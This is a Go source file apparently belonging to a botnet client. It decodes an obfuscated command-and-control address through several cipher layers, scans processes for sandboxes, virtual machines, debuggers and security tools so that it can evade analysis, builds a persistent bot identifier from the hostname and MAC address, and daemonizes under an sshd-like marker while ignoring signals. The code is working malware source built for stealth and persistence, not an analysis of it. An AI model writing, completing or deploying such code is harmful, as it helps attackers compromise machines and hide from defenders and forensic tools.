package main

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

// ============================================================================
// ANTI-ANALYSIS: KEY DERIVATION FUNCTIONS
// These functions split the encryption key across multiple XOR operations
// to make static analysis more difficult. Each returns a single byte.
// ============================================================================

// mew returns the first byte of the derived key (0x31 XOR 0x64 = 0x55)
func mew() byte { return byte(0x31 ^ 0x64) }

// mewtwo returns the second byte of the derived key (0x72 XOR 0x17 = 0x65)
func mewtwo() byte { return byte(0x72 ^ 0x17) }

// celebi returns the third byte of the derived key (0x93 XOR 0xC6 = 0x55)
func celebi() byte { return byte(0x93 ^ 0xc6) }

// jirachi returns the fourth byte of the derived key (0xA4 XOR 0x81 = 0x25)
func jirachi() byte { return byte(0xa4 ^ 0x81) }

// ============================================================================
// CRYPTOGRAPHIC FUNCTIONS
// ============================================================================

// charizard derives a 16-byte encryption key from the seed string.
func charizard(seed string) []byte {
	h := md5.New()
	h.Write([]byte(seed))
	h.Write([]byte{mew(), mewtwo(), celebi(), jirachi()})
	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	for i := range entropy {
		entropy[i] ^= byte(len(seed) + i*17)
	}
	h.Write(entropy)
	return h.Sum(nil)
}

// blastoise implements an RC4-like stream cipher for encryption/decryption.
func blastoise(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := range s {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		result[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return result
}

// venusaur decodes the multi-layer obfuscated C2 address.
// Decoding layers (reverse order of encoding):
//
//	Layer 1: Base64 decode
//	Layer 2: XOR with rotating key
//	Layer 3: RC4 stream cipher decrypt
//	Layer 4: Reverse byte substitution (rotate right 3, XOR 0xAA)
//	Final: Verify MD5 checksum of payload
//
// Parameters:
//   - encoded: Base64 encoded obfuscated string from gothTits constant
//
// Returns: Decoded C2 address (e.g., "192.168.1.1:443") or empty string on error
func venusaur(encoded string) string {
	layer1, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	key := charizard(cryptSeed)
	layer2 := make([]byte, len(layer1))
	for i := range layer1 {
		layer2[i] = layer1[i] ^ key[i%len(key)]
	}
	layer3 := blastoise(layer2, key)
	result := make([]byte, len(layer3))
	for i := range layer3 {
		b := layer3[i]
		b = ((b << 3) | (b >> 5))
		b ^= 0xAA
		result[i] = b
	}
	if len(result) < 5 {
		return ""
	}
	payload := result[:len(result)-4]
	checksum := result[len(result)-4:]
	h := md5.New()
	h.Write(payload)
	expected := h.Sum(nil)[:4]
	for i := range checksum {
		if checksum[i] != expected[i] {
			return ""
		}
	}
	return string(payload)
}

// ============================================================================
// ANTI-ANALYSIS & SANDBOX DETECTION
// ============================================================================

// winnti detects if the bot is running in a sandbox or analysis environment.
// Detection methods:
//  1. Check for VM indicators in process cmdlines (vmware, vbox, qemu, etc.)
//  2. Look for running analysis tools (strace, gdb, wireshark, etc.)
//  3. Check if parent process is a debugger
//
// Returns: true if sandbox/analysis detected, false if safe to run
func winnti() bool {
	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}
			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range vmIndicators {
					if strings.Contains(cmdStr, indicator) {
						return true
					}
				}
			}
		}
	}
	analysisTools := []string{
		// Debuggers & tracers
		"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb",
		"/usr/bin/lldb", "/usr/bin/valgrind", "/usr/bin/perf",
		// Reverse engineering
		"/usr/bin/radare2", "/usr/bin/r2", "/usr/bin/rizin",
		"/usr/bin/cutter", "/usr/bin/iaito",
		"/usr/bin/ghidra", "/usr/bin/ghidraRun",
		"/usr/bin/ida", "/usr/bin/ida64", "/usr/bin/idat", "/usr/bin/idat64",
		"/usr/bin/objdump", "/usr/bin/readelf",
		"/usr/bin/retdec-decompiler",
		// Network capture & analysis
		"/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump",
		"/usr/bin/ngrep", "/usr/bin/ettercap",
		"/usr/sbin/tcpdump", "/usr/sbin/ettercap",
		// Malware analysis frameworks
		"/usr/bin/yara", "/usr/bin/ssdeep",
		"/usr/bin/binwalk", "/usr/bin/foremost",
		// Process & syscall monitoring
		"/usr/bin/sysdig", "/usr/bin/bpftrace",
		"/usr/bin/auditd", "/usr/sbin/auditd",
		"/usr/bin/ausearch", "/usr/sbin/ausearch",
		"/usr/bin/fatrace", "/usr/bin/inotifywait",
		// Security scanners
		"/usr/bin/lynis", "/usr/bin/rkhunter",
		"/usr/bin/chkrootkit", "/usr/sbin/chkrootkit",
		"/usr/bin/clamdscan", "/usr/bin/clamscan",
		// Memory forensics
		"/usr/bin/volatility", "/usr/bin/vol.py",
		"/usr/bin/gcore",
	}
	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
				if len(strings.TrimSpace(string(out))) > 0 {
					return true
				}
			}
		}
	}
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			debuggers := []string{
				"gdb", "lldb", "strace", "ltrace", "radare2", "r2",
				"rizin", "rr", "valgrind", "perf", "ida", "ida64",
				"ghidra", "sysdig", "bpftrace", "frida", "frida-server",
			}
			for _, debugger := range debuggers {
				if strings.Contains(parentCmd, debugger) {
					return true
				}
			}
		}
	}
	return false
}

// mustangPanda generates a unique 8-character bot identifier.
// Combines hostname and MAC address, then hashes with MD5.
// This ID persists across reboots for consistent bot tracking.
// Returns: 8-character hex string (first 8 chars of MD5 hash)
func mustangPanda() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}
	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

// ============================================================================
// DAEMONIZATION (UNIX)
// Full background daemonization: fork, setsid, close fds, ignore signals.
// ============================================================================

// daemonEnvKey is used to distinguish the parent from the re-exec'd child.
const daemonEnvKey = "__SSHD_DAEMON"

// stuxnet performs full Unix daemonization so the bot runs completely
// detached from any controlling terminal.
//

func stuxnet() {
	// Already the daemon child – just finish housekeeping.
	if os.Getenv(daemonEnvKey) == "1" {
		daemonHousekeep()
		return
	}

	// --- Parent path: re-exec as a daemon child ---
	exe, err := os.Executable()
	if err != nil {
		// Can't determine our own path; fall through and run in foreground.
		return
	}

	// Set marker so the child knows it is the daemon.
	env := append(os.Environ(), daemonEnvKey+"=1")

	// Build the child process attributes: new session, detached.
	attr := &syscall.ProcAttr{
		Dir: "/",
		Env: env,
		Files: []uintptr{
			uintptr(devNull(os.O_RDONLY)), // stdin
			uintptr(devNull(os.O_WRONLY)), // stdout
			uintptr(devNull(os.O_WRONLY)), // stderr
		},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
		},
	}

	// Fork+exec ourselves.
	_, _, forkErr := syscall.StartProcess(exe, os.Args, attr)
	if forkErr != nil {
		// Fork failed – just continue in the foreground.
		return
	}

	// Parent exits; child is now the daemon.
	os.Exit(0)
}

// daemonHousekeep performs post-fork housekeeping in the daemon child:
// chdir /, umask 0, reopen std fds to /dev/null, ignore signals.
func daemonHousekeep() {
	// Change working directory to root.
	syscall.Chdir("/")

	// Clear umask.
	syscall.Umask(0)

	// Re-open stdin/stdout/stderr to /dev/null (safety net).
	devNullFd := devNull(os.O_RDWR)
	if devNullFd >= 0 {
		syscall.Dup2(devNullFd, int(os.Stdin.Fd()))
		syscall.Dup2(devNullFd, int(os.Stdout.Fd()))
		syscall.Dup2(devNullFd, int(os.Stderr.Fd()))
		if devNullFd > 2 {
			syscall.Close(devNullFd)
		}
	}

	// Ignore every signal we can.
	ignoreSignals()
}

// devNull opens /dev/null with the requested flags and returns the fd.
// Returns -1 on failure.
func devNull(flag int) int {
	fd, err := syscall.Open("/dev/null", flag, 0)
	if err != nil {
		return -1
	}
	return fd
}

// ignoreSignals tells the runtime to discard hangup, terminal, and user
// signals so the daemon survives terminal closes and stray signals.
//
// NOTE: SIGTERM is NOT ignored so that revilSingleInstance() can still
// kill an older daemonized instance when a new binary is deployed.
func ignoreSignals() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig,
		syscall.SIGHUP,  // terminal hangup — must survive
		syscall.SIGINT,  // Ctrl-C — no terminal, but be safe
		syscall.SIGQUIT, // Ctrl-\ — ignore core dump request
		syscall.SIGUSR1, // user defined
		syscall.SIGUSR2, // user defined
		syscall.SIGTSTP, // Ctrl-Z — no terminal to suspend to
		syscall.SIGTTIN, // bg read from tty
		syscall.SIGTTOU, // bg write to tty
	)
	// Drain and discard in background.
	go func() {
		for range sig {
			// intentionally ignored
		}
	}()
}
